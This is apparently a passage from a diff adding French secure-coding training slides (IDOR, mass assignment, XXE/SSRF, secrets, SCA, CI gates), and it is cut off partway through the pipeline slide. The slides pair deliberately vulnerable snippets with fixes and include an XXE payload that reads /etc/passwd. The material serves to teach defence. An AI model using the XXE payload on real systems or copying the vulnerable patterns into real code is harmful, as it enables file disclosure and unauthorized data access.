+        <span class="font-mono text-cyber-accent text-xl">MODULE 2</span>
+        <h2 class="text-4xl font-bold font-mono text-white">IDOR / BOLA</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-2xl font-bold text-white mb-3 text-red-400">Scénario</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            Je suis utilisateur A (ID 100). Je remplace <code>/contrats/100</code> par <code>/contrats/101</code>.  
+            Si j’accède au contrat d’un autre adhérent, c’est une IDOR/BOLA.
+          </p>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">VULNÉRABLE (auth sans authZ)</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              <span class="code-func">@GetMapping</span>("/contrat/{id}")<br>
+              public Contrat get(@PathVariable Long id, User user) {<br>
+              &nbsp;&nbsp;<span class="code-comment">// Auth OK, mais aucune vérification d'appartenance</span><br>
+              &nbsp;&nbsp;return repo.findById(id); <span class="code-danger"><-- DANGER</span><br>
+              }
+            </div>
+          </div>
+
+          <div class="terminal-box">
+            <div class="terminal-header text-xs text-green-400 font-bold">SECURE (vérif objet)</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              public Contrat get(Long id, User user) {<br>
+              &nbsp;&nbsp;Contrat c = repo.findById(id);<br>
+              &nbsp;&nbsp;<span class="code-keyword">if</span> (!c.getOwnerId().equals(user.getId())) {<br>
+              &nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">throw new</span> AccessDeniedException();<br>
+              &nbsp;&nbsp;}<br>
+              &nbsp;&nbsp;return c;<br>
+              }
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Prévenir les IDOR (pratique)</h3>
+
+          <div class="space-y-4">
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Règle 1: AuthZ par objet</div>
+              <p class="text-sm text-slate-300">
+                Chaque accès à une ressource “adhérent” doit vérifier une policy: “est-ce que cet utilisateur a le droit sur cet objet?”
+              </p>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Règle 2: Filtrer au niveau requête</div>
+              <p class="text-sm text-slate-300">
+                Idéalement, la requête inclut l’identifiant utilisateur (évite l’oubli du check après coup).
+              </p>
+              <div class="terminal-box mt-3">
+                <div class="p-3 text-xs font-mono text-slate-200">
+                  SELECT * FROM contrats WHERE id = $1 AND owner_id = $2;
+                </div>
+              </div>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Règle 3: Tests</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>Test: user A tente d’accéder à objet de B → 403</li>
+                <li>Test: endpoints “liste” ne doivent pas inclure d’objets hors périmètre</li>
+                <li>Test: pas de fuite d’existence (éviter 404/403 incohérents si nécessaire)</li>
+              </ul>
+            </div>
+
+            <div class="bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200">
+              Standard attendu: aucune ressource métier accessible sans policy explicite.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 8: Mass Assignment -->
+    <div class="slide justify-center" id="slide-8" data-title="Logique & Accès : Mass Assignment (DTO)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 2</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Mass Assignment</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-2xl font-bold text-white mb-4 text-orange-400">Le piège</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            L’attaquant envoie des champs non présents dans l’UI: <code>role</code>, <code>isAdmin</code>, <code>status</code>, <code>creditLimit</code>.  
+            Si le backend “bind” tout le JSON à l’entité, il applique ces champs.
+          </p>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">VULNÉRABLE (Node/Express style)</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              <span class="code-func">app.post</span>('/profile', async (req, res) =&gt; {<br>
+              &nbsp;&nbsp;<span class="code-comment">// Bind complet du body</span><br>
+              &nbsp;&nbsp;await User.update({ id: req.user.id }, <span class="code-danger">req.body</span>);<br>
+              &nbsp;&nbsp;res.sendStatus(204);<br>
+              });
+            </div>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Impact</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Escalade de privilèges (role/admin)</li>
+              <li>Altération de statut (validation, paiement, remboursement)</li>
+              <li>Contournement workflow métier</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Solution: DTO strict + allowlist</h3>
+
+          <div class="space-y-4">
+            <div class="terminal-box">
+              <div class="terminal-header text-xs text-green-400 font-bold">SECURE (allowlist)</div>
+              <div class="p-4 text-xs font-mono text-slate-200">
+                const dto = {<br>
+                &nbsp;&nbsp;email: req.body.email,<br>
+                &nbsp;&nbsp;nom: req.body.nom,<br>
+                &nbsp;&nbsp;telephone: req.body.telephone,<br>
+                };<br>
+                await User.update({ id: req.user.id }, dto);
+              </div>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Validation serveur</div>
+              <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+                <li>Schéma (types, longueur, format, enum)</li>
+                <li>Rejet explicite des champs inattendus (optionnel mais utile)</li>
+                <li>Logs: tracer “champ inattendu reçu” sans logguer la donnée sensible</li>
+              </ul>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-4">
+              <div class="text-slate-200 font-mono font-bold mb-2">Astuce architecture</div>
+              <p class="text-sm text-slate-300">
+                Ne jamais exposer directement des entités DB via API.  
+                Mapper DB → DTO sortie, et DTO entrée → DB.
+              </p>
+            </div>
+
+            <div class="bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200">
+              Standard attendu: endpoints d’update = DTO dédiés, jamais “req.body” direct.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 9: XXE & SSRF -->
+    <div class="slide justify-center" id="slide-9" data-title="Parsing & Flux : XXE + SSRF">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 3</span>
+        <h2 class="text-4xl font-bold font-mono text-white">XXE & SSRF</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4"><i class="fa-solid fa-file-code text-cyber-accent mr-2"></i>XXE</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            XML External Entity: quand un parser XML autorise des entités externes, l’attaquant peut forcer des lectures de fichiers
+            ou des accès réseau (selon config).
+          </p>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">Risque</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;<br>
+              &lt;root&gt;&amp;xxe;&lt;/root&gt;
+            </div>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Remédiation</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Désactiver DTD / entités externes</li>
+              <li>Utiliser des parsers “secure by default”</li>
+              <li>Limiter taille/profondeur (DoS XML)</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4"><i class="fa-solid fa-network-wired text-cyber-accent mr-2"></i>SSRF</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            Server-Side Request Forgery: quand le serveur fait une requête sortante basée sur une entrée utilisateur (URL),
+            l’attaquant peut viser des services internes (métadonnées cloud, admin panels, APIs privées).
+          </p>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">Vulnérable</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              const url = req.body.url;<br>
+              const resp = await fetch(<span class="code-danger">url</span>);<br>
+              return res.send(await resp.text());
+            </div>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Remédiation (pratique)</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Allowlist stricte (domaines, chemins)</li>
+              <li>Bloquer IP privées / loopback / link-local</li>
+              <li>Désactiver redirects, timeouts courts</li>
+              <li>Proxy sortant contrôlé + observabilité</li>
+            </ul>
+          </div>
+
+          <div class="bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200 mt-4">
+            Standard attendu: pas de fetch(URL) user-controlled sans allowlist + contrôles réseau.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 10: Secrets & Logs -->
+    <div class="slide justify-center" id="slide-10" data-title="Sécurité des Données : Secrets & Logs">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 4</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Secrets & Logs</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4"><i class="fa-solid fa-key text-yellow-400 mr-2"></i>Gestion des secrets</h3>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">INTERDIT</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              <span class="code-danger">const API_KEY = "sk_live_12345";</span><br>
+              <span class="code-comment">// commit Git = fuite durable</span>
+            </div>
+          </div>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-green-400 font-bold">ATTENDU</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              const API_KEY = process.env.API_KEY;<br>
+              <span class="code-comment">// et stockage via vault / secret manager selon contexte</span>
+            </div>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Standard</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Rotation périodique (et après incident)</li>
+              <li>Scans secrets en CI (et idéalement pre-commit)</li>
+              <li>Scopes minimaux (API keys limitées)</li>
+              <li>Traçabilité: qui a accédé, quand</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4"><i class="fa-solid fa-file-waveform text-blue-400 mr-2"></i>Logs & données sensibles</h3>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4 mb-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Risque</div>
+            <p class="text-sm text-slate-300">
+              Les logs finissent dans des systèmes centralisés. S’ils contiennent PII, santé, tokens, ils deviennent une base secondaire de fuite.
+            </p>
+          </div>
+
+          <div class="terminal-box mb-4">
+            <div class="terminal-header text-xs text-red-400 font-bold">BAD</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              log.info("User created: " + user.toString());<br>
+              log.debug("Headers: " + request.getHeaders());<br>
+              <span class="code-comment">// tokens / données santé peuvent se retrouver ici</span>
+            </div>
+          </div>
+
+          <div class="terminal-box">
+            <div class="terminal-header text-xs text-green-400 font-bold">GOOD</div>
+            <div class="p-4 text-xs font-mono text-slate-200">
+              log.info("User created", { id: user.id, correlationId });<br>
+              log.warn("Validation error", { field: "email", correlationId });<br>
+              <span class="code-comment">// redaction + logs structurés</span>
+            </div>
+          </div>
+
+          <div class="mt-4 bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200">
+            Standard attendu: logs structurés + redaction + pas de secrets/PII en clair.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 11: Dépendances (SCA) -->
+    <div class="slide justify-center" id="slide-11" data-title="Sécurité des Données : Dépendances (SCA)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 4</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Dépendances (SCA)</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4"><i class="fa-solid fa-cubes text-purple-400 mr-2"></i>Pourquoi c’est critique</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            Une grosse partie du risque vient des bibliothèques. Une dépendance vulnérable = vulnérabilité importée.
+          </p>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Standard attendu</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Lockfile présent et respecté</li>
+              <li>Politique de mise à jour (mensuelle / trimestrielle)</li>
+              <li>Scan SCA en CI et en PR</li>
+              <li>Bloquer sur vulnérabilités critiques exploitables</li>
+            </ul>
+          </div>
+
+          <div class="mt-4 bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Pièges</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Paquets abandonnés</li>
+              <li>Transitives vulnérables (pas visibles)</li>
+              <li>Versions flottantes</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="terminal-box flex flex-col">
+          <div class="terminal-header">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-green"></div>
+            <span class="text-xs text-slate-400 font-mono ml-2">sca_commands.txt</span>
+          </div>
+          <div class="p-5 text-xs font-mono text-slate-200 space-y-3">
+            <p class="text-green-400"># Exemples (selon stack)</p>
+            <p>> npm audit</p>
+            <p>> yarn audit</p>
+            <p>> mvn -DskipTests dependency:tree</p>
+            <p>> OWASP Dependency-Check</p>
+            <p class="text-yellow-400 mt-4"># En CI</p>
+            <p>> échouer le pipeline si CVSS/critique + exploitabilité élevée</p>
+            <p>> générer SBOM si possible (suivi des composants)</p>
+            <p class="text-slate-500 mt-4">But: transformer le “pentest findings” en garde-fou permanent.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 12: Hall of Shame -->
+    <div class="slide justify-center" id="slide-12" data-title="Code Quality : Hall of Shame">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 5</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Hall of Shame</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-red-900/10 border border-red-900 rounded-lg p-6">
+          <div class="flex items-center gap-4 mb-4">
+            <div class="text-4xl text-red-600"><i class="fa-solid fa-ban"></i></div>
+            <div>
+              <h3 class="font-bold text-red-400 uppercase tracking-widest text-sm">Interdit</h3>
+              <p class="text-sm text-slate-300">Ce sont des patterns qui re-génèrent des findings en continu.</p>
+            </div>
+          </div>
+
+          <ul class="text-sm text-slate-300 list-disc pl-5 space-y-3">
+            <li><span class="font-mono text-slate-100">Trust Client</span> : validations JS uniquement (attaquant = cURL/Burp).</li>
+            <li><span class="font-mono text-slate-100">Catch-all silencieux</span> : try/catch vide, ou “TODO” permanent.</li>
+            <li><span class="font-mono text-slate-100">Commentaires dette</span> : “temporaire” resté 3 ans.</li>
+            <li><span class="font-mono text-slate-100">Hardcoding</span> : secrets, URLs prod, flags de debug.</li>
+            <li><span class="font-mono text-slate-100">Logs bavards</span> : stacktraces, tokens, PII en clair.</li>
+          </ul>
+        </div>
+
+        <div class="terminal-box">
+          <div class="terminal-header">
+            <span class="text-xs text-slate-300 font-bold">Exemples</span>
+            <span class="text-xs text-slate-500 ml-auto">mauvaises pratiques</span>
+          </div>
+          <div class="p-5 text-xs font-mono text-slate-200 space-y-4">
+            <div>
+              <div class="text-red-300 font-bold mb-1">Trust Client</div>
+              <p><span class="code-comment">// Front</span> if (email.includes("@")) ok = true;</p>
+              <p><span class="code-comment">// Back</span> <span class="code-danger">aucune validation</span></p>
+            </div>
+            <div>
+              <div class="text-red-300 font-bold mb-1">Catch silencieux</div>
+              <p>try { doRisky(); } catch (e) { <span class="code-danger">// TODO</span> }</p>
+            </div>
+            <div>
+              <div class="text-red-300 font-bold mb-1">Hardcoding</div>
+              <p><span class="code-danger">const BASE_URL = "https://prod.api.local";</span></p>
+            </div>
+            <div class="text-slate-500">
+              Objectif: ces patterns doivent être détectés par linter/SAST et bloqués en PR.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 13: Niveau 1 -->
+    <div class="slide justify-center" id="slide-13" data-title="Niveau 1 : L'Obligatoire (Blocking)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 5</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Niveau 1 : L’Obligatoire</h2>
+      </div>
+
+      <div class="bg-cyber-card border-l-4 border-l-red-500 border border-slate-700 p-6 rounded-xl">
+        <div class="flex justify-between items-center mb-4">
+          <h3 class="text-2xl font-bold text-white font-mono">Non négociable pour passer en production</h3>
+          <span class="bg-red-500 text-black text-xs font-bold px-3 py-1 rounded">BLOCKING</span>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="font-mono text-green-300 font-bold mb-2">Entrées validées</div>
+            <p class="text-slate-300">Typage + contraintes (longueur, format, enum). Validation serveur systématique.</p>
+          </div>
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="font-mono text-green-300 font-bold mb-2">0 concat SQL</div>
+            <p class="text-slate-300">Requêtes paramétrées uniquement. Identifiants dynamiques via allowlist.</p>
+          </div>
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="font-mono text-green-300 font-bold mb-2">Zéro secret</div>
+            <p class="text-slate-300">Secrets hors Git, rotation, scan secrets en CI.</p>
+          </div>
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="font-mono text-green-300 font-bold mb-2">HTTPS partout</div>
+            <p class="text-slate-300">Pas de contenu mixte, HSTS selon politique.</p>
+          </div>
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="font-mono text-green-300 font-bold mb-2">Auth vérifiée</div>
+            <p class="text-slate-300">Pas d’endpoint “oublié”. AuthN + AuthZ cohérentes.</p>
+          </div>
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="font-mono text-green-300 font-bold mb-2">Erreurs propres</div>
+            <p class="text-slate-300">Pas de stacktrace en prod. Gestion centralisée.</p>
+          </div>
+        </div>
+
+        <div class="mt-6 bg-slate-900 border border-slate-700 rounded p-4">
+          <div class="text-slate-200 font-mono font-bold mb-2">Critère PR</div>
+          <p class="text-sm text-slate-300">
+            Si un point du Niveau 1 manque, la Pull Request est rejetée. Le but est de rendre l’exception impossible.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 14: Niveau 2 -->
+    <div class="slide justify-center" id="slide-14" data-title="Niveau 2 : Le Standard (Professionnel)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 5</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Niveau 2 : Le Standard</h2>
+      </div>
+
+      <div class="bg-cyber-card border-l-4 border-l-yellow-500 border border-slate-700 p-6 rounded-xl">
+        <div class="flex justify-between items-center mb-4">
+          <h3 class="text-2xl font-bold text-white font-mono">Qualité attendue en contexte Mutuelle</h3>
+          <span class="bg-yellow-500 text-black text-xs font-bold px-3 py-1 rounded">PROFESSIONNEL</span>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-yellow-300 font-mono font-bold mb-2">Architecture</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>DTO stricts (pas d’entités DB exposées)</li>
+              <li>Gestion centralisée des erreurs</li>
+              <li>Contrôles d’accès factorisés (policies, middleware)</li>
+            </ul>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-yellow-300 font-mono font-bold mb-2">Qualité</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Typage fort (Typescript strict / Java generics)</li>
+              <li>Linters actifs sans “warning ignoré”</li>
+              <li>Tests unitaires pertinents (dont cas de sécurité)</li>
+            </ul>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-yellow-300 font-mono font-bold mb-2">Observabilité</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Logs structurés + correlationId</li>
+              <li>Alerting sur comportements anormaux</li>
+              <li>Traçabilité des actions sensibles</li>
+            </ul>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-yellow-300 font-mono font-bold mb-2">Revue</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Checklist PR partagée</li>
+              <li>Revue croisée obligatoire sur endpoints sensibles</li>
+              <li>Définition of Done incluant sécurité</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 15: Niveau 3 -->
+    <div class="slide justify-center" id="slide-15" data-title="Niveau 3 : Excellence (Robuste)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 5</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Niveau 3 : L’Excellence</h2>
+      </div>
+
+      <div class="bg-cyber-card border-l-4 border-l-green-500 border border-slate-700 p-6 rounded-xl">
+        <div class="flex justify-between items-center mb-4">
+          <h3 class="text-2xl font-bold text-white font-mono">Optionnel, mais recommandé pour blinder</h3>
+          <span class="bg-green-500 text-black text-xs font-bold px-3 py-1 rounded">ROBUSTE</span>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-4">
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-green-300 font-mono font-bold mb-2">Tests sécu</div>
+            <p class="text-sm text-slate-300">
+              Tests unitaires qui tentent injections (SQLi/XSS/IDOR) et valident l’échec attendu.
+            </p>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-green-300 font-mono font-bold mb-2">Headers avancés</div>
+            <p class="text-sm text-slate-300">
+              CSP plus fine, HSTS, anti-clickjacking selon stratégie, réduction surface.
+            </p>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-green-300 font-mono font-bold mb-2">Value Objects</div>
+            <p class="text-sm text-slate-300">
+              EmailAddress, IBAN, Numéro adhérent: validation à la construction, invariants.
+            </p>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5 lg:col-span-2">
+            <div class="text-green-300 font-mono font-bold mb-2">Immutabilité</div>
+            <p class="text-sm text-slate-300">
+              Limite les effets de bord, réduit les mutations involontaires, améliore la prédictibilité.
+            </p>
+            <div class="terminal-box mt-3">
+              <div class="p-3 text-xs font-mono text-slate-200">
+                <span class="code-comment">// Exemple conceptuel: objets de domaine non modifiables après création</span><br>
+                class Contract { constructor(readonly id, readonly ownerId, readonly status) {} }
+              </div>
+            </div>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-5">
+            <div class="text-green-300 font-mono font-bold mb-2">Durcissement</div>
+            <p class="text-sm text-slate-300">
+              Limites rate, timeouts, quotas, segmentation réseaux, secrets manager.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 16: Linter & SAST -->
+    <div class="slide justify-center" id="slide-16" data-title="Industrialiser : Linter & SAST">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 6</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Linter & SAST</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
+        <div class="space-y-6">
+          <h3 class="text-2xl font-bold text-white">Le correcteur orthographique sécurité</h3>
+          <p class="text-slate-300">
+            On ne compte pas sur la mémoire. On automatise la détection des patterns vus dans les modules.
+          </p>
+
+          <div class="space-y-4">
+            <div class="flex items-center gap-4 bg-cyber-card p-4 rounded border border-slate-600">
+              <div class="text-3xl text-blue-400"><i class="fa-solid fa-magnifying-glass-code"></i></div>
+              <div>
+                <strong class="text-white block">SonarLint / SonarQube</strong>
+                <span class="text-xs text-slate-300">Qualité + sécurité baseline. Idéal dans l’IDE + gate CI.</span>
+              </div>
+            </div>
+
+            <div class="flex items-center gap-4 bg-cyber-card p-4 rounded border border-slate-600">
+              <div class="text-3xl text-green-400"><i class="fa-solid fa-code-branch"></i></div>
+              <div>
+                <strong class="text-white block">Semgrep</strong>
+                <span class="text-xs text-slate-300">Rapide, rules custom (ex: “interdire req.body direct”, “interdire innerHTML”).</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Exemples de règles utiles</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Détecter concat SQL / template non échappé</li>
+              <li>Détecter “req.body” passé direct à update()</li>
+              <li>Détecter fetch(url) user-controlled</li>
+              <li>Détecter hardcoded secrets</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="terminal-box h-full flex flex-col p-6">
+          <div class="terminal-header">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-green"></div>
+            <span class="text-xs text-slate-400 font-mono ml-2">policy.txt</span>
+          </div>
+          <div class="p-4 text-xs font-mono text-slate-200 space-y-3">
+            <p class="text-green-400"># Politique simple</p>
+            <p>> Linter: ne doit pas passer avec warnings ignorés.</p>
+            <p>> SAST: échoue si vulnérabilité critique (Niveau 1).</p>
+            <p>> SCA: échoue si dépendance critique exploitable.</p>
+            <p>> Secrets: échoue si secret détecté.</p>
+
+            <p class="text-yellow-400 mt-4"># Principe</p>
+            <p>> Le pipeline n’est pas un rapport: c’est un garde-fou.</p>
+            <p>> On préfère “bloquer tôt” plutôt que “corriger en crise”.</p>
+
+            <p class="text-slate-500 mt-4">
+              Résultat attendu: réduction massive des findings récurrents d’un pentest à l’autre.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 17: Pipeline CI/CD -->
+    <div class="slide justify-center" id="slide-17" data-title="Industrialiser : Pipeline CI/CD Sécurisée">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">MODULE 6</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Pipeline CI/CD Sécurisée</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Objectif</h3>
+          <p class="text-sm text-slate-300 mb-4">
+            Bloquer automatiquement les régressions Niveau 1 (et idéalement une partie du Niveau 2).
+          </p>
+
+          <div class="bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Gates recommandés</div>
+            <ul class="text-sm text-slate-300 list-disc pl-5 space-y-1">
+              <li>Tests unitaires</li>
+              <li>Scan secrets</li>
+              <li>SAST rapide</li>
+              <li>SCA (dépendances)</li>
+              <li>Build et packaging</li>
+            </ul>
+          </div>
+
+          <div class="mt-4 bg-slate-900 border border-slate-700 rounded p-4">
+            <div class="text-slate-200 font-mono font-bold mb-2">Pratique</div>
+            <p class="text-sm text-slate-300">
+              Règle simple: si la CI ne bloque pas un pattern “Hall of Shame”, elle ne sert pas encore.
+            </p>
+          </div>
+        </div>
+
+        <div class="terminal-box h-full flex flex-col justify-center p-8">
+          <div class="text-center font-mono text-white mb-6">PIPELINE MINIMAL (RÉALISTE)</div>
+
+          <div class="flex flex-col gap-2 relative">
+            <div class="absolute left-6 top-4 bottom-4 w-1 bg-slate-700 -z-10"></div>
+
+            <div class="flex items-center gap-4">
+              <div class="w-12 h-12 rounded-full bg-slate-800 border-2 border-slate-500 flex items-center justify-center z-10"><i class="fa-brands fa-git-alt"></i></div>
+              <div class="text-slate-300">Commit / PR</div>
+            </div>
+
+            <div class="flex items-center gap-4">
